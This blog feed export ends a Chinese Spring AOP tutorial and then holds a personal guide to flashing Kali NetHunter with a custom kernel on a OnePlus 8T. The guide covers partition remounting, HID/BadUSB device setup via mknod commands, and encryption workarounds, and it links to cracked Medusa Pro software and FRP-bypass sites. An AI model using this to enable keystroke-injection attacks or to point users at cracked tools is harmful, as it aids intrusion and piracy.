class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>@Aspect</strong>：声明该类为切面类。</li><li><strong>@Component</strong>：让 Spring 自动扫描并管理这个切面对象。</li><li><em><em>@Before(“execution(</em> UserService.createUser(..))”)</em>*：定义切点表达式，表示对 <code>UserService</code> 类中 <code>createUser</code> 方法的调用，在执行前调用 <code>beforeCreateUser</code> 方法。</li><li><em><em>@After(“execution(</em> UserService.createUser(..))”)</em>*：类似地，表示在 <code>createUser</code> 方法执行后调用 <code>afterCreateUser</code> 方法。</li></ul><ol><li>配置 Spring 使 AOP 生效</li></ol><p>在 Spring 配置中，需要启用 AOP 支持。例如，如果使用基于注解的配置，可以在配置类上添加 <code>@EnableAspectJAutoProxy</code> 注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.EnableAspectJAutoProxy;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableAspectJAutoProxy</span>  <span class="comment">// 启用 AOP 支持</span></span><br><span class="line"><span class="meta">@ComponentScan(basePackages = &quot;com.example&quot;)</span> <span class="comment">// 假设所有类都在 com.example 包下</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>测试切面效果</li></ol><p>编写一个测试程序，通过 Spring 容器获取目标对象，并调用方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AopTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(AppConfig.class);</span><br><span class="line">        <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> context.getBean(UserService.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 仅对 createUser 方法设置了切面</span></span><br><span class="line">        userService.createUser(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">        userService.deleteUser(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>预期输出：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LoggingAspect: 在调用 createUser 方法前记录日志。</span><br><span class="line">UserService: 正在创建用户 Alice</span><br><span class="line">LoggingAspect: 在调用 createUser 方法后记录日志。</span><br><span class="line">UserService: 正在删除用户 Alice</span><br></pre></td></tr></table></figure><p>注意：由于切面中只定义了对 <code>createUser</code> 方法的前置和后置通知，调用 <code>deleteUser</code> 时不会有日志记录。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><ul><li><strong>切面（Aspect）</strong>：通过 <code>@Aspect</code> 注解定义，封装了横切关注点（例如日志记录）。</li><li><strong>通知（Advice）</strong>：切面内的方法，如 <code>beforeCreateUser</code> 和 <code>afterCreateUser</code>，分别在目标方法执行前后被调用。</li><li><strong>切点（Pointcut）</strong>：通过注解表达式（如 <code>execution(* UserService.createUser(..))</code>）指定在哪些方法上应用这些通知。</li></ul><p>这个例子展示了如何用 Spring AOP 的注解方式定义一个切面，从而在目标方法调用前后插入日志记录逻辑。</p><h3 id="简单案例3："><a href="#简单案例3：" class="headerlink" title="简单案例3："></a>简单案例3：</h3><p>下面通过一个简单的示例来解释 AspectJAroundAdvice 和 AspectJExpressionPointcut 的含义和用途。</p><h4 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h4><p>在 Spring AOP 中：</p><ul><li><strong>AspectJAroundAdvice</strong> 是基于 AspectJ 的环绕通知实现。 它包装了一个“切面方法”（比如某个切面类中的环绕通知方法），当目标方法被调用时，AspectJAroundAdvice 会调用这个切面方法，从而在目标方法调用前后插入你定义的逻辑。</li><li><strong>AspectJExpressionPointcut</strong> 则是用来定义<strong>切点</strong>的，它采用 AspectJ 表达式语言来描述在哪些方法调用上应用通知。 例如，表达式 <code>execution(* com.example.MyService.doWork(..))</code> 就表示匹配 MyService 类中所有名为 doWork 的方法调用。</li></ul><h4 id="示例说明"><a href="#示例说明" class="headerlink" title="示例说明"></a>示例说明</h4><p>假设我们有如下场景：</p><ul><li>有一个业务类 <code>MyService</code>，它有一个方法 <code>doWork()</code>。</li><li>我们希望在调用 <code>doWork()</code> 前后插入日志记录。</li></ul><ol><li>定义目标类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doWork</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyService: 正在执行 doWork 方法...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>定义切面类</li></ol><p>我们定义一个切面类 <code>MyAspect</code>，其中包含一个环绕通知方法。 这个方法在执行前后分别输出日志，并最终调用目标方法（使用 pjp.proceed()）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">around</span><span class="params">(ProceedingJoinPoint pjp)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyAspect: 方法执行前&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">retVal</span> <span class="operator">=</span> pjp.proceed();  <span class="comment">// 调用目标方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;MyAspect: 方法执行后&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li><code>around</code> 方法就是我们想要在目标方法调用前后执行的增强逻辑。</li><li>这就是实际的“通知”（Advice）。</li></ul><ol><li>使用 AspectJAroundAdvice 将切面方法包装成 Advice</li></ol><p>在 Spring AOP 内部，可以使用 AspectJAroundAdvice 将切面方法封装为一个 Advice 对象。</p><p> 这一步通常由 AOP 框架自动完成，但我们可以理解为：</p><ul><li><strong>AspectJAroundAdvice</strong> 持有了 <code>MyAspect.around</code> 这个方法，以及如何获取 <code>MyAspect</code> 实例的工厂。</li><li>当目标方法匹配切点时，框架会调用 AspectJAroundAdvice，进而调用 <code>MyAspect.around</code>。</li></ul><p>例如，内部可能类似这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (伪代码示意)</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">aspectMethod</span> <span class="operator">=</span> MyAspect.class.getMethod(<span class="string">&quot;around&quot;</span>, ProceedingJoinPoint.class);</span><br><span class="line"><span class="type">AspectJAroundAdvice</span> <span class="variable">advice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJAroundAdvice</span>(aspectMethod, <span class="keyword">new</span> <span class="title class_">SingletonAspectInstanceFactory</span>(<span class="keyword">new</span> <span class="title class_">MyAspect</span>()));</span><br></pre></td></tr></table></figure><p>这里，<code>SingletonAspectInstanceFactory</code> 用来返回同一个 MyAspect 实例。</p><ol><li>使用 AspectJExpressionPointcut 定义切点</li></ol><p>切点负责决定在哪些方法上应用上面的 Advice。</p><p> 例如，我们可以用如下 AspectJ 表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AspectJExpressionPointcut</span> <span class="variable">pointcut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AspectJExpressionPointcut</span>();</span><br><span class="line">pointcut.setExpression(<span class="string">&quot;execution(* MyService.doWork(..))&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>这个表达式匹配 <code>MyService</code> 类中所有名为 <code>doWork</code> 的方法。</li></ul><ol><li>结合 Advisor</li></ol><p>Advisor 会将 Advice 和切点组合在一起，告诉代理： “当匹配到 <code>MyService.doWork(..)</code> 时，就应用这个环绕通知逻辑。” 例如，可以构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将上面封装好的 AspectJAroundAdvice 与切点结合，构成一个 Advisor</span></span><br><span class="line"><span class="type">DefaultPointcutAdvisor</span> <span class="variable">advisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultPointcutAdvisor</span>(pointcut, advice);</span><br></pre></td></tr></table></figure><p>（这里的 advisor 在实际使用中会被加入到 AdvisedSupport 中）</p><ol><li>应用代理</li></ol><p>在最终的代理对象中，当调用 <code>MyService.doWork()</code> 时，Spring AOP 框架：</p><ul><li>先检查 Advisor 列表，发现 advisor 的切点匹配该方法，</li><li>然后通过 AspectJAroundAdvice 触发环绕通知，调用 <code>MyAspect.around</code> 方法，</li><li>这就实现在方法执行前后输出日志，然后调用目标方法。</li></ul><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><ul><li><strong>AspectJAroundAdvice</strong>： 用于封装一个环绕通知方法（比如 <code>MyAspect.around</code>），它告诉框架在目标方法调用前后执行哪些逻辑。 它是一个实现了 MethodInterceptor 接口的 Advice。</li><li><strong>AspectJExpressionPointcut</strong>： 用来定义切点，采用 AspectJ 表达式指定哪些方法调用需要被拦截。 例如 <code>&quot;execution(* MyService.doWork(..))&quot;</code> 就匹配 <code>MyService.doWork()</code> 方法。</li><li><strong>两者如何协同工作</strong>： Advisor 将 Advice（AspectJAroundAdvice）和切点（AspectJExpressionPointcut）绑定在一起，告诉代理对象“对符合切点的方法，应用这个 Advice”。 当代理对象调用目标方法时，符合切点的方法会被拦截，进入 Advice（环绕通知）逻辑，从而在目标方法执行前后执行自定义逻辑。</li></ul><p>这个例子展示了如何利用 AspectJAroundAdvice 和 AspectJExpressionPointcut 实现一个简单的切面，来在目标方法执行前后输出日志，从而帮助你理解它们的作用和使用场景。</p><p>笔者:han</p><p>博客:<a href="http://hanblog.top/">http://hanblog.top</a></p><p>若有错误欢迎大佬指出</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springaop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。</title>
      <link href="/2024/07/07/%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E7%9B%B8%E4%BF%A1%E8%BF%99%E6%98%AF%E4%B8%80%E7%AF%87%E5%AF%B9%E4%BD%A0%E5%BE%88%E6%9C%89%E7%94%A8%E7%9A%84%E5%88%B7kali%20nethunter%E5%AE%8C%E6%95%B4%E7%89%88(%E5%86%85%E6%A0%B8)%E7%AC%94%E8%AE%B0%EF%BC%81oneplus%208T%E6%9C%BA%E5%9E%8B%E4%B8%BA%E4%BE%8B/"/>
      <url>/2024/07/07/%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E7%9B%B8%E4%BF%A1%E8%BF%99%E6%98%AF%E4%B8%80%E7%AF%87%E5%AF%B9%E4%BD%A0%E5%BE%88%E6%9C%89%E7%94%A8%E7%9A%84%E5%88%B7kali%20nethunter%E5%AE%8C%E6%95%B4%E7%89%88(%E5%86%85%E6%A0%B8)%E7%AC%94%E8%AE%B0%EF%BC%81oneplus%208T%E6%9C%BA%E5%9E%8B%E4%B8%BA%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="【原创】相信这是一篇对你很有用的刷kali-nethunter完整版-内核-笔记！oneplus-8T机型为例。"><a href="#【原创】相信这是一篇对你很有用的刷kali-nethunter完整版-内核-笔记！oneplus-8T机型为例。" class="headerlink" title="【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。"></a>【原创】相信这是一篇对你很有用的刷kali nethunter完整版(内核)笔记！oneplus 8T机型为例。</h1><p>笔者小白。下文若有错误请多多包含,欢迎提出改正给我。</p><p><strong>联系方式</strong></p><ul><li>QQ：1512624649</li><li>QQ群：983224309</li><li>博客：<a href="http://hanblog.top/">http://hanblog.top</a></li><li>GitHub：<a href="https://github.com/cxkhanhan">https://github.com/cxkhanhan</a></li></ul><h2 id="阅读之前须知："><a href="#阅读之前须知：" class="headerlink" title="阅读之前须知："></a>阅读之前须知：</h2><p>下文有两张参考的图片。如果未加载出来请开魔法。然后重新刷新页面。不看的话也影响不大。</p><p>阅读本篇文章的需求：请注意笔者分享的踩坑点。以及具备自行查阅资料和探索钻研的能力。不要当巨婴，就连那些最简单的问题都不舍得去chatgpt一下。</p><p>本笔记面向人群：刚入坑kali nethunter。想要刷一部nethunter完整版手机。或者在刷的过程中遇到一些问题。</p><p>笔者对下文的内容会进行详略描写。原因：详细描写的地方是由于网上无人整理总结。或者说都是论坛里提供的方法。寻找困难，非常零散。</p><p>一般不做介绍的东西就是网上已经有很多师傅的相关笔记和总结了。我再写上去只会看的很愚蠢。</p><p>下文涉及到的大部分资源都给各位整理好了。不然怎么说是一个有用的笔记呢？链接如下：</p><p>链接：<a href="https://pan.baidu.com/s/1rC7JP3MGMtEpNItRGSyqcg?pwd=han0">https://pan.baidu.com/s/1rC7JP3MGMtEpNItRGSyqcg?pwd=han0</a><br>提取码：han0<br>–来自百度网盘超级会员V4的分享</p><p>解压密码如下：1512624649han</p><h2 id="机型："><a href="#机型：" class="headerlink" title="机型："></a>机型：</h2><p>下文以One plus 8T为例。(大部分方法也适用于其他手机。存在一定差异。需要各位自行探索。如果感觉困难。可以直接去买kali官方有教程的机型)</p><p><a href="https://www.kali.org/docs/nethunter/">Kali NetHunter | Kali Linux Documentation</a></p><p>需要注意的是！！！很多工具等等都是精细到版本。不同的机型要有不同的工具和版本！！！如果不会的话。要么找网上完整版的教程，然后严格控制自己的机型和固件包等等都是一摸一样的。后文也会给出oneplus 8T宝宝巴士版教程！还有个师傅的完整版的oneplus 8pro的教程在下面给出。注意看教程有没有讲刷内核。</p><p>要么就是看官方文档里的教程。同时也做到机型等等一摸一样！！！</p><p>oneplus 8pro教程：<a href="https://blog.csdn.net/a648642694/article/details/127450785">https://blog.csdn.net/a648642694/article/details/127450785</a></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><h3 id="捋一遍思路：精简版"><a href="#捋一遍思路：精简版" class="headerlink" title="捋一遍思路：精简版"></a>捋一遍思路：精简版</h3><p>1:bl解锁</p><p>2:安装magisk和twrp(orangefox也行).</p><p>3:在magisk中安装kali nethunter</p><p>4:用ro2rw或者systemrw对分区进行更改。把分区从只读的改成读写的。（有的手机在这一步会遇到分区解密问题。这个会在后文讲讲收集到的解决办法。）</p><p>5:twrp中刷入内核文件。</p><p>需要注意的是：网络上有些教程后面的4,5都没有讲。只讲了1,2,3。</p><p>区别在于：如果不刷入内核文件。很多功能比如badusb，网卡监听等等。</p><p>将会无法正常使用！会显示内核不支持功能。要么就是要自己外置网卡才能监听等等。</p><h3 id="宝宝巴士完整版："><a href="#宝宝巴士完整版：" class="headerlink" title="宝宝巴士完整版："></a>宝宝巴士完整版：</h3><p>适用于大部分机型,但主要参考的机型是oneplus 8T。可能与您的手机存在差异。</p><p>配置:版本号Hydrogen OS 11.0.13.13 KB05 Android版本:11 型号:KB2000</p><p>1:手机用数据线连接电脑。打开开发者模式，打开usb调试，打开oem解锁(部分机型需要更改一个 usb偏好设置，改为文件传输即可)</p><p>2:bl解锁。使用platform-tools里的工具解锁。具体参考这篇文章。</p><p><a href="https://onfix.cn/course/4309">解BL锁，Bootloader 解锁图文教程，刷机Root必备刷机解锁 (onfix.cn)</a></p><p>oneplus用户直接用大侠阿木的工具箱就行。里面有一键解锁功能。</p><p>3:安装magisk。同时给boot打补丁。参考这篇文章<a href="https://sspai.com/post/67932#!">Android 玩家必备神器入门：从零开始安装 Magisk - 少数派 (sspai.com)</a></p><p>4:安装适配的twrp版本。参考这篇文章<a href="https://onfix.cn/course/3845">手机刷 TWRP 方法，刷三方Recovery方法（解决卡米问题）刷机解锁 (onfix.cn)</a></p><p>oneplus的用户的相关rec版本参考：<a href="https://www.daxiaamu.com/6480/">一加各机型TWRP官方&#x2F;非官方版本，含最新3.7.0版本 - 大侠阿木博客 (daxiaamu.com)</a></p><p>如果还是嫌麻烦。大侠阿木的工具箱里也支持一键安装magisk。一加全能盒子(App手机版)里支持一键安装twrp。</p><p>5:把nethunter-oneplus8-all-*-kalifs-full.zip这种类似的几个G的文件从电脑上通过usb传输到手机上。</p><p>然后再通过magisk刷入这个刚传输进来的模块。</p><p>6:更改分区有两种方法，建议先用第一种。如果不行再用第二种。</p><p>一:在twrp或者orangefox中刷入systermrw*.zip这个文件。请不要勾选zip signature verification选项。(官方说的，不是本人的病毒)。可以参考</p><p>[<a href="https://xdaforums.com/t/closed-universal-systemrw-superrw-feat-makerw-ro2rw-read-only-2-read-write-super-partition-converter.4247311/">Closed] Universal SystemRW &#x2F; SuperRW feat. MakeRW &#x2F; ro2rw (read-only-2-read&#x2F;write super partition converter) | XDA Forums</a></p><p>笔者提供的整合的资源链接里如果systemrw1.32不能成功,请尝试更高的版本。笔者会提供两个版本。</p><p>如何检验是否成功？如果你看得懂他给你的反馈那就直接看英文。看不懂的话。就打开MT管理器。找到根目录。尝试去创建一个新的文件夹。如果能正常创建。则是成功。如果不行。请尝试上面的systemrw换版本，如果之后还是不行。请参考下面第二种方法：</p><p>二:ro2rw：</p><p>使用要求：安装了Magisk并且有10-15GB的可用空间的已root手机。</p><p>以及安装一个termux软件。</p><p>需要注意的是：如果出现空间不足什么的乱七八糟的东西。强制你去删除一些文件。请你认真选择要删除哪些文件。如果删除部分关键文件。会导致你无法正常使用。</p><p>这个问题会出现在下面这个参考文章的第五张图和第六张图中间。</p><p>具体用法可以参考</p><p><a href="https://xdaforums.com/t/set-your-system-folder-to-r-w-mode-with-ro2rw-android-13-magisk-2024-method.4648921/">Set your &#x2F;system folder to r&#x2F;w mode with RO2RW! Android 13, Magisk 2024 method | XDA Forums</a></p><p>7:如果上面的步骤都成功！没有出现乱七八糟的问题！那么恭喜你。只剩下最后一个问题。刷入内核。</p><p>笔者会在上面给出的整理资源链接里给出 Android 11的新和旧的内核文件。以及Android12的内核文件。刷入即可。</p><p>为什么给出新旧内核？</p><p>原因是：可能会遇见新内核不支持相对应的手机。旧内核就会支持。这也是上文强调过很多次的版本问题。各种软件，硬件之间的版本。需要自行查阅和寻找。涉及的面太广。不可能都指出。同时这也要感谢_MH8888这位师傅在<a href="https://blog.csdn.net/a648642694/article/details/127450785%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E9%87%8C%E5%88%86%E4%BA%AB%E7%9A%84%E8%B8%A9%E5%9D%91%E7%82%B9%E3%80%82%E5%9B%A0%E4%B8%BA%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%9D%91%E5%92%8C%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%9D%91%E6%88%91%E4%B9%9F%E9%83%BD%E8%B8%A9%E4%B8%AD%E4%BA%86%E3%80%82%E8%B0%A2%E8%B0%A2%E5%B8%88%E5%82%85%E5%88%86%E4%BA%AB%E7%BB%8F%E9%AA%8C%E3%80%82%E4%B8%8D%E7%84%B6%E5%A4%A9%E7%9F%A5%E9%81%93%E6%88%91%E8%A6%81%E6%89%BE%E5%A4%9A%E4%B9%85%E8%AE%BA%E5%9D%9B%E6%89%8D%E8%83%BD%E7%BF%BB%E5%88%B0%E8%BF%99%E4%B8%AA%E6%97%A7%E5%86%85%E6%A0%B8%E3%80%82">https://blog.csdn.net/a648642694/article/details/127450785这篇文章里分享的踩坑点。因为第一个坑和第二个坑我也都踩中了。谢谢师傅分享经验。不然天知道我要找多久论坛才能翻到这个旧内核。</a></p><p>下文也会放出一些相关的踩坑点。可以看做是这个师傅的补充踩坑点。</p><p>8:当刷入内核之后。成功启动。你可以点击设置。查看手机的配置。如果内核版本这里出现nethunter！那么就恭喜你内核也成功刷入！可以正常使用。</p><p>但是关于刷入之后或者刷入之前或者后续的相关功能可能仍然存在一定问题。笔者会在文章后面给出一些经验。</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20240707021850049.png" alt="image-20240707021850049"></p><h2 id="oneplus-8-8t-8pro-Android13-为什么刷fastboot-flash-recovery-twrp不成功？"><a href="#oneplus-8-8t-8pro-Android13-为什么刷fastboot-flash-recovery-twrp不成功？" class="headerlink" title="oneplus 8&#x2F;8t&#x2F;8pro Android13+为什么刷fastboot flash recovery twrp不成功？"></a>oneplus 8&#x2F;8t&#x2F;8pro Android13+为什么刷fastboot flash recovery twrp不成功？</h2><p>解决方法：</p><p>fastboot flash recovery_a twrp_op8_ext4-3.7.0-b3.img<br>fastboot flash recovery_b twrp_op8_erofs-3.7.0-b3.img</p><p>刷入beta版本的。笔者也会在上面链接里给出资源。</p><p>参考文章[[TWRP][3.7.0-13][instantnoodle]TWRP for OnePlus 8&#x2F;8Pro ][OFFICIAL][BETA 3] | XDA Forums](<a href="https://xdaforums.com/t/twrp-3-7-0-13-instantnoodle-twrp-for-oneplus-8-8pro-official-beta-3.4341707/">https://xdaforums.com/t/twrp-3-7-0-13-instantnoodle-twrp-for-oneplus-8-8pro-official-beta-3.4341707/</a>)</p><h2 id="成功刷入内核之后。怎么rucky-duckHunter-HID还是无法正常使用？如何解决？"><a href="#成功刷入内核之后。怎么rucky-duckHunter-HID还是无法正常使用？如何解决？" class="headerlink" title="成功刷入内核之后。怎么rucky,duckHunter HID还是无法正常使用？如何解决？:"></a>成功刷入内核之后。怎么rucky,duckHunter HID还是无法正常使用？如何解决？:</h2><p>当我们遇到HID interface not found please enable in usb arsenal或者usb arsenal里有failed to set usb function或者kernel not support hid等等字眼的时候.</p><p>解决方法如下：</p><p>1:关闭usb调试。如果开启就无法正常检测HID。</p><p>2:usb arsenal里的usb function选择rndis,hid,mass_storage</p><p>界面的adb改成 disabled。</p><p>3:执行如下命令mknod –mode&#x3D;666 &#x2F;dev&#x2F;hidg0 c 240 0 &amp;&amp; mknod –mode&#x3D;666 &#x2F;dev&#x2F;hidg1 c 240 1 &amp;&amp; dmesg | grep hidg</p><h2 id="分区解密是什么？为什么我twrp打开没东西或者东西极少？但是usb连接手机之后在电脑上能看到并且一堆东西？为什么我的twrp打开都是乱码？"><a href="#分区解密是什么？为什么我twrp打开没东西或者东西极少？但是usb连接手机之后在电脑上能看到并且一堆东西？为什么我的twrp打开都是乱码？" class="headerlink" title="分区解密是什么？为什么我twrp打开没东西或者东西极少？但是usb连接手机之后在电脑上能看到并且一堆东西？为什么我的twrp打开都是乱码？"></a>分区解密是什么？为什么我twrp打开没东西或者东西极少？但是usb连接手机之后在电脑上能看到并且一堆东西？为什么我的twrp打开都是乱码？</h2><p>分区都是加密的。</p><p>高版本的安卓的twrp可能会无法去自动解密解密。</p><p>原因可能是版本升级。很多软件在Android7,8还是Android10,11来着前后变化很大。因为底层东西变化了。</p><p>或者说变得更安全了。所以我们这些不符合厂商预期的危险操作也就更难了。</p><p>并且相关的很多的高版本twrp都处于beta状态。</p><p>比如这篇文章就是[[TWRP][3.7.0-13][instantnoodle]TWRP for OnePlus 8&#x2F;8Pro ][OFFICIAL][BETA 3] | XDA Forums](<a href="https://xdaforums.com/t/twrp-3-7-0-13-instantnoodle-twrp-for-oneplus-8-8pro-official-beta-3.4341707/">https://xdaforums.com/t/twrp-3-7-0-13-instantnoodle-twrp-for-oneplus-8-8pro-official-beta-3.4341707/</a>)</p><p>具体可自行去了解</p><p>解决方法：</p><p>要么换rec。要么用qfil提取分区文件然后重新刷。</p><p>第一种:换成相关版本的rec。还需要给手机上锁屏密码。然后进入rec之后会要求你输入密码。输入之后就可以正常解密分区了。</p><p>参考这个链接<a href="https://www.daxiaamu.com/6480/">一加各机型TWRP官方&#x2F;非官方版本，含最新3.7.0版本 - 大侠阿木博客 (daxiaamu.com)</a></p><p>第二种。不支持oneplus机型。其他机型可以尝试。</p><p>需要文件prog__ufs_firehose_sm8250_lge.elf(这个文件好像是通用的)和一个xml后缀的文件。一般在固件包里可以找到。但oneplus的固件包里我找不到。</p><p>除了QFIL还可以使用Medusa Box Software（也可以称为Medusa Pro Box）但是笔者找不到一个能用的破解版。要么就是付费的。要么就是远古时期的破解版什么的。但都无法使用。各位可以自行再去找找相关文件。也可能是我电脑原因无法正常运行。所以在下面放出一些参考链接。自行查阅</p><p>把分区用工具提取出来。然后重新刷入分区，并用命令让他不进行加密即可。</p><p>具体的命令笔者找不到了。是在一个youtube上看到的。。感兴趣的师傅们可以自行找找</p><p>参考网址：[下载 Medusa Pro Box 软件工具 v2.2.5.1 <a href="https://www.bypassfrpfiles.com/zh-CN/2024/01/download-medusa-pro-box-software/">最新版本] (bypassfrpfiles.com)</a></p><p><a href="https://medusabox.com/eng/download/software">Medusa Box Downloads - Software, Drivers, Manual</a></p><p><a href="https://medium.com/@hassancracksfull/medusa-pro-2-6-1-7-crack-without-box-full-setup-download-aa4ba7dd8a15">Medusa Pro 2.6.1.7 Crack + Without Box Full Setup Download | by Hassancracksfull | Medium</a></p><p><a href="https://imold.wang/technology/phone/1332.html/2/#%E8%A7%A3%E5%AF%86Data%E5%92%8C%E8%B7%B3%E8%BF%87%E8%B0%B7%E6%AD%8C%E5%BC%80%E6%9C%BA%E5%90%91%E5%AF%BC%E9%AA%8C%E8%AF%81">Lgv50终极超详细9008线刷救砖 – 第 2 页 – 极客轩 (imold.wang)</a></p><h2 id="为什么我一进入nethunter-terminal的root-shell就死机。未响应？我该如何解决？换成其他普通用户就行。但是一用su命令就会卡死。"><a href="#为什么我一进入nethunter-terminal的root-shell就死机。未响应？我该如何解决？换成其他普通用户就行。但是一用su命令就会卡死。" class="headerlink" title="为什么我一进入nethunter terminal的root shell就死机。未响应？我该如何解决？换成其他普通用户就行。但是一用su命令就会卡死。"></a>为什么我一进入nethunter terminal的root shell就死机。未响应？我该如何解决？换成其他普通用户就行。但是一用su命令就会卡死。</h2><p>请把你的magisk版本提高。因为如果你是跟着这个师傅的教程去使用的话。<a href="https://blog.csdn.net/a648642694/article/details/127450785">https://blog.csdn.net/a648642694/article/details/127450785</a></p><p>Magisk版本太低是23.0无法给nethunter terminal给予root权限。</p><p>请你升级到最新版本。原因无非就是magisk版本太低，检测不到root请求。</p><h2 id="只有一部手机怎么办？用之前该如何备份？如果刷机之后版本不同无法云备份等等或者云备份空间不够怎么办？："><a href="#只有一部手机怎么办？用之前该如何备份？如果刷机之后版本不同无法云备份等等或者云备份空间不够怎么办？：" class="headerlink" title="只有一部手机怎么办？用之前该如何备份？如果刷机之后版本不同无法云备份等等或者云备份空间不够怎么办？："></a>只有一部手机怎么办？用之前该如何备份？如果刷机之后版本不同无法云备份等等或者云备份空间不够怎么办？：</h2><p>使用databackup。上面的资源链接里会给出两个databackup apk文件。一个是低版本(某位师傅发我的)。一个是高版本。后续去release拿的。</p><p>大概使用方法：</p><p>手机和电脑处于同一内网。在你电脑里搭建ftp服务端。然后在云端里添加用户。填入名称和内网ip地址。用户名和密码。点击确定之后。会有一个测试连接的选项。点击测试。如果成功就可以开始传递你的数据上去。</p><p>如果不成功。那么请你检查是否处于同一内网。是否能ping通或者nmap扫出。检查防火墙是否配置成功。不会配置的可以暂时关掉。</p><p>最后点击云端这个界面有个九宫格的图标。里面有备份和恢复。上传到电脑备份就好。</p><p>这个老版的app不知道为什么无法正常上传图片。但其他都正常。所以请各位尝试新版的。下面图片是老版的app截图。</p><p>关于ftp云端搭建请看链接：<a href="https://blog.csdn.net/Alex_81D/article/details/135296467">超详情的Windows搭建FTP服务器教程-（老奶奶来了也能搭好）_windows安装ftp-CSDN博客</a></p><p><img 